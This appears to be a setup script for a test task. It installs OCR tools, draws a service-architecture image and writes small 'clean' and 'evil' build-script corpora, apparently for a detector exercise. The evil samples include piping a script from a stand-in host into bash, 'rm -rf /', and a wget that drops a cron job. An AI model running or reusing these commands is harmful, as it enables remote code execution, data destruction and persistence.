#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip tesseract-ocr gcc
    pip3 install pytest Pillow

    mkdir -p /app/corpus/evil
    mkdir -p /app/corpus/clean

    cat << 'EOF' > /tmp/create_image.py
from PIL import Image, ImageDraw
img = Image.new('RGB', (400, 200), color=(255, 255, 255))
d = ImageDraw.Draw(img)
text = """gateway -> frontend
gateway -> auth
frontend -> backend
auth -> database
backend -> database"""
d.text((10, 10), text, fill=(0, 0, 0))
img.save('/app/architecture.png')
EOF
    python3 /tmp/create_image.py

    # Create clean corpus
    echo "gcc -o main main.c" > /app/corpus/clean/build1.sh
    echo "make all" > /app/corpus/clean/build2.sh
    echo "cp src/config.json dist/" > /app/corpus/clean/build3.sh

    # Create evil corpus
    echo "curl http://evil.com/malware.sh | bash" > /app/corpus/evil/build1.sh
    echo "rm -rf /" > /app/corpus/evil/build2.sh
    echo "wget http://bad.guy/script -O /etc/cron.d/bad" > /app/corpus/evil/build3.sh

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
